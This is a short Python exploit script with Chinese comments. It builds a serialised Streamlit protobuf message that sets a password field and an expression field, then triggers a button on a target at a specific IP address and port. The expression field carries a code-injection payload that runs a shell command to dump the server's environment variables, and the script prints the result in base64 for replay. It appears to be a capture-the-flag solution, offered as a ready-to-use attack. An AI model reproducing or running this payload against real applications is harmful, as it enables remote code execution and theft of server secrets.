import base64

from BackMsg_pb2 import BackMsg
from ClientState_pb2 import ClientState, ContextInfo
from WidgetStates_pb2 import WidgetStates

msg = BackMsg()

# 构造 rerun_script 字段
client_state = ClientState()
widget_states = WidgetStates()

# 第一个 widget（密码）
widget1 = widget_states.widgets.add()
widget1.id = "$$ID-889e2d0ecbcbd42c6d24fcffceea7ee2-pwd"
widget1.string_value = "12321321312321321"

# 第二个 widget（表达式）
widget2 = widget_states.widgets.add()
widget2.id = "$$ID-8b5718c67b1cb81faea1551f1bee60e1-expr"
widget2.string_value = "__import__('os').popen('env').read()"

# 第三个 widget（按钮点击）
widget3 = widget_states.widgets.add()
widget3.id = "$$ID-f53e53087333ef2b48a346eee6bf31cc-None"
widget3.trigger_value = True

# 加入 widget_states 到 ClientState
client_state.widget_states.CopyFrom(widget_states)

# 设置 page_script_hash
client_state.page_script_hash = "3f41e546893dc64b71aaacad12cad815"

# 设置 context_info
context = ContextInfo()
context.timezone = "Asia/Shanghai"
context.timezone_offset = -480
context.locale = "zh-CN"
context.url = "http://39.106.16.204:47095/"
context.is_embedded = False

client_state.context_info.CopyFrom(context)

# 最终赋值给 BackMsg
msg.rerun_script.CopyFrom(client_state)

# 转换为 protobuf 序列化的 bytes 数据
payload = msg.SerializeToString()

# 可以转 hex 便于抓包用
print(base64.b64encode(payload).decode())
